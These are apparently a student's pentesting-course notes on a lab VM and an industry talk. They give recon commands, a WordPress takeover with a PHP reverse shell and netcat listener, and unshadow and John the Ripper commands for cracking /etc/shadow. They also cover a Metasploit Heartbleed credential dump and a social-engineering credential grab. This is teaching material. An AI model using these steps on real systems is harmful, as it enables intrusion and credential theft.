---
title: Sprint 3
---
# FFA 1 - Monday

Speaking to David and Frank, they seemed to have a solid grounding in the subject. David spoke about traversing the web app that the class was invited to break. There were three main findings as part of his talk:
1) The Rest API is quite open and so through particular links he was able to find a list of user data UNENCRYPTED
2) the source code on the login page shows the user unencrypted
3) invalidating a cookie on the login page reveals the server version. David was able to cross check the common vulnerabilities on Common Vulnerabilites and Exposures (CVE) for that particular version. Frank is working through Natas. This is probably best as it is expected that we reach bandit 30 and natas 15 by the end of today.

# Monday Demo
"You cant hack what you cant see" - Darsh
"enumerate, enumerate, enumaerate" - drsh
There are many tools to breaj the machine
vuln will give you an ova, import to virtual box
setup NAT network

Attacker - 10.0.2.15
Box - 10.0.2.4

Assuming we are in the network and cant get past login
From attackers machine:
NMAP - ip addr
find ip

Enumerate subnet and find ip of victim:
nmap -sP 10.0.2.0/24 (ping scan)
        <subnet>
  
  ping ip to validate

to enumerate:
netdiscover - needs device and range

netdiscover -i etho0 -r 10.0.2.0/24
            <interface> <range>
  
to find open ports:
nmap 10.0.2.4 - not always recommended as the default script may be too noisy or not always work

nmap -sv - enumerates all the versions, e.g. which version of ftp

searchsploit proftpd 1.3.3 - shows expoits for given protocol version, in this case proftpd 1.3.3
Drsh then when to exploit-db.com and searched for proftpd1.3.3c
what was revealed was metaploit (backdoor) and RCE (compromised source backdoor)
created new directory to load directory 
cd Documents/
mkdir

used wget to load exploits

msfconsole (metasploit framework console)
Drsh doesnt recommend to use metasploit to start out - ITS TOO EASY - Jason
By googling the exploit, drsh was able to find - aldeid - wiki page
GOAL:reverse tunnel to execute commands as root

to check if root:
id;

whoami;


Breaking http:
typed in ip to browser
searchsploit httpd 2.4.18
NO RESULTS

try curl:
curl 10.0.2.4
shows cource of webpage

Directory enumaeration to see invisible directories
dirb <url> <path to wordlist (dictory of common dir names)>
 in this case /usr/share/wordlists/dirb/common.txt
  
  had to mod host.conf
  10.0.2.4 vtsec
  type in vtcsec
  
From the dirb we discovered its a wordpress page - notoriously vulnerable
wpscan is deesigned to specifically scan wordpress

Discovered user is admin admin

Drsh went for a reverse shell
found a cheat sheet through pentestmonkey

netcat
nc -nlvp 10.0.2.4 1234
-l listener
-p port number
The listener must be up first before the script can be executed


change 404 page to includea PHP reverse shell
since we're admin, the 404 page can be changed tthrough the webpage
point ip to 10.0.2.15 machine
also point to transmit tp port 1234
why?
The server needs to poin to the attacker
why is ther server trying to connect to the attacker?

The reverse shell is  trying to  create a connection without having a direct way in


upgrade shell - ropnop.com
not necessary but prettier

to check if possible to escalate to root
look at psswd and shadow
use hashcat or John the Ripper to brute force

tmux - terminal splitter




  
  
  
  
# Scrum 2

# Scrum 3

Deliverable 1 - John the Ripper

John the Ripper is a free password cracker. 

It is used to used to execute 3 basic password attacks:

- Brute force: goes through every possible combination to find the solution
- Dictionary: a list of passwords. The tool will cross check the list with a possible match
- Rainbow: a rainbow table is a list of pre-computed hashes. Similar to a dictionary attack, the tool cross-checks with this list.

John requires that the file to crack is needed in a particular format. In a linux system, it is common to break the /etc/passwdd and /etc/shadow files where drsh ended on Monday's demo. We need to use the unshadow utility to convert the files into a text file:

```bash
/usr/sbin/unshadow /etc/passwd /etc//shadow > ~/passwordstocrack.txt
```

to perform the crack:
```bash
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ~/passwordstocrack.txt
```

The above example was used directly from one of a website but I will do my best to explain the syntax.
/usr/sbin/john - initiates JtR
--wordlist=<path to list> - tells JtR to use a dictionary. In this case, the rockyou.txt file was used which is a list of common compromised passwords from the web.
~/passwordstocrack.txt - the file containing of passwords for us to crack

Deliverable 2

Deliverable 3


# Wednesday Industry
Deloitte
If both vms are on NAT, they should be able to interact

What is Pentesting?
Think like criminals
advide clients on hoe to imporve security
art & science

what do we do?
meetings
talk about what to test
reporting - findings and solutions

Physical - locks, cctv, elevators
Human - social engineering, 'forgotten link'
Cyber - 

Infrastructure - internal network, wifi, windows auth systems
Web Apps
Mobile Apps
Physical and social engineering
Red teaming
Citrix/Kiosk breakout

XSS
Find apache cred folder through text box
using xss to root
using expliot-db 

Database weaknesses
1) Create account
2) add it to admin group

Demonstrated a social engineering ploy executed on a company. They told them that ip's from Russia and Turkey were attacking them. Proxy auth was used to snatch the employees creds. On their end, they saw ip 1:: and the employee creds in plaintext.
They also mentioned hacking kiosks through navigating to a sight using a webpage that allows file uploads. Through this, a malicious shell can be injected through an open usb port and crack passwords

Red Teaming
breaking into a building

Pentesting vs Red eaming
Specific                Realistic
Limited Scope           Relevent       
Narrow focus            Readiness

Tools
Physical
Proxmark3 Card Resder
Low freq antenana

Metasploit
Powershell empire

power bank

ifconfig - find ip of machine
-T4 specifies speed
netdiscover - find alike hosts
nmaps -sSV -n -T4 -p 4949 192.168.119.135
make sure to specify protocol and port
HTTPS
sslscan <ip:port>
tls not running properly
nmap --script=ssl-heartbleed -p 4949 -T4 192.168.119.135

msfdb run - run metasploit
search heartbleed
use <path to module>
        >option
        >set RHOSTs target ip
        >run - will scan by defualt
        set action DUMP
        >run
        strings <file>
        creds dumped
